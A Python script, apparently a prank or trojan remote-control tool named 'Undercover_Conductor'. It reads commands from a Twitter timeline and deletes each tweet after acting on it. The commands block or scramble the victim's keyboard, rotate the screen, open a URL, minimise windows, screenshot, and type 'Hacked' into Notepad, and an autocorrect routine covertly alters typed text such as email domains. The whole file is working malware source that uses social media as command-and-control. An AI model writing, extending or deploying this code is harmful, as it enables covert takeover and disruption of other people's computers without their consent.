import keyboard
import mouse
import smtplib
import pyautogui
import rotatescreen
import os
import tweepy
import configparser

from threading import Timer
from datetime import datetime
from time import sleep
from PIL import Image


# Twitter API Credentials
config = configparser.ConfigParser()
config.read('config.ini')

api_key = config['twitter']['api_key']
api_key_secret = config['twitter']['api_key_secret']

access_token = config['twitter']['access_token']
access_token_secret = config['twitter']['access_token_secret']

# Twitter API Authentication
auth = tweepy.OAuthHandler(api_key, api_key_secret)
auth.set_access_token(access_token, access_token_secret)

api = tweepy.API(auth)

class Undercover_Conductor:
    def __init__(self):
        self.log = ""
        self.end = False

    keys = ['q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', \
    'z', 'x', 'c', 'v', 'b', 'n', 'm', 'space', 'enter', 'control', 'shift', 'tab', 'esc', 'alt', 'win', 'backspace', \
    '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '[', ']', ';', '\'', ',', '.', '/', '\\', '`']

    autocorrect_words = {
        ' ' : 'SPACE',
        'you' : 'u',
        'gmail.com' : 'mail.com'
    }

    def start(self):
        # # Starts listening to keys
        # keyboard.on_release(callback=self.callback)
        # # Maintains the program until CTRL+C is pressed test
        # keyboard.wait() 
        while self.end == False:
            tweets = api.user_timeline()
            if len(tweets) != 0:
                tweet = tweets[0]
                self.check_commands(tweet.text.lower())
                api.destroy_status(tweet.id)
            sleep(1)

    # Finds and run commands from the keyboard input
    def check_commands(self, string):
        if string.find("test") != -1:
            self.simple_test()
        elif string.find("stop") != -1:
            self.block_keys()
        elif string.find("start") != -1:
            self.unblock_keys()
        elif string.find("url") != -1:
            self.go_to_url()
        elif string.find("rotate") != -1:
            self.rotate_screen()
        elif string.find("jumble") != -1:
            self.remap_keys()
        elif string.find("sort") != -1:
            self.unremap_keys()
        elif string.find("screen") != -1:
            self.screenshot()
        elif string.find("minimise") != -1:
            self.minimise()
        elif string.find('end') != -1:
            self.end = True

    # Blocks all inputs from the keyboard using the keys list
    def block_keys(self):
        for key in self.keys:
            keyboard.block_key(key)

    # Unblocks all input from the keyboard using the keys list
    def unblock_keys(self):
        for key in self.keys:
            keyboard.unhook(key)

    # Simple test to check if the program works
    def simple_test(self):
        self.block_keys()
        pyautogui.hotkey("winleft", "m")
        pyautogui.press("winleft")
        pyautogui.write("notepad")
        pyautogui.press("enter")
        sleep(0.5)
        pyautogui.write("Hacked")
        self.unblock_keys()
        self.log = ""

    # Blocks all inputs from the keyboard for 10 seconds then unblocks them
    def pause_keyboard(self):
        self.block_keys()
        sleep(5)
        self.unblock_keys()
        self.log = ""

    # Automatically changes any words typed using the key-value pairs in the autocorrect_words dictionary
    def autocorrect(self, string):
        for word in self.autocorrect_words.keys():
            if string.find(word) != -1:
                for i in range(len(word)):
                    keyboard.press('backspace')
                    sleep(0.001)
                keyboard.write(self.autocorrect_words[word])
                self.log = ""
    
    # Sends user to the specified url on default browser
    def go_to_url(self):
        pyautogui.hotkey("winleft", "r")
        pyautogui.write("https://www.youtube.com/watch?v=gojhTzO09r0")
        pyautogui.press("enter")
        self.log = ""

    # Rotates screen 90 degrees
    def rotate_screen(self):
        screen = rotatescreen.get_primary_display()
        start_pos = screen.current_orientation
        new_pos = abs((start_pos - 90) % 360)
        screen.rotate_to(new_pos)
        self.log = ""

    # Remaps all the alphabet keys to something different
    def remap_keys(self):
        for i in range(26):
            keyboard.remap_key(self.keys[i],self.keys[i+1])
    
    # Returns the remaped keys to normal
    def unremap_keys(self):
        for i in range(26):
            keyboard.unremap_key(self.keys[i])

    # Remaps the alphabet keys temporarily for 10 seconds
    def temp_remap_keys(self):
        self.remap_keys()
        sleep(5)
        self.unremap_keys()
        self.log = ""

    # Takes a screenshot and displays the image
    def screenshot(self):
        img = pyautogui.screenshot()
        img.show()
        self.log = ""
    
    # Continuously minimises all applications for 10 seconds
    def minimise(self):
        pyautogui.hotkey("winleft", "m")
        self.log = ""


if __name__ == "__main__":
    program = Undercover_Conductor()
    program.start()